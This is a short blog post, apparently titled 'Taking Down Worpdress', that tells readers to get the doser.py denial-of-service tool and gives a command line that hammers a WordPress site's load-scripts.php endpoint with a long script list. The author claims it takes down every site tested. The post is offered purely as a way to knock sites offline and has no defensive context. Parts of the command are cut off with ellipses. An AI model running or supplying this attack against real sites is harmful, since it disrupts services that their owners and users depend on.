---
title: "Taking Down Worpdress"
date: 2020-04-14T12:00:20+08:00
tags: ["wordpress"]
draft: false
hideReadMore : true
---
...
Doser.py is DoS tool for HTPP requests written in Python. Hence, ensure you have Python installed in advanced.

You can get the doser.py program from: `https://github.com/Quitten/doser.py`

<!--more-->

Here is the snippets can be used to take down Wordpress sites (at least for all sites I've tested).

```python
python doser.py -g 'https://example.com/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y',
...
Credits : https://blog.zulfahmy.net/blog/bring-down-any-wordpress-with-doser-py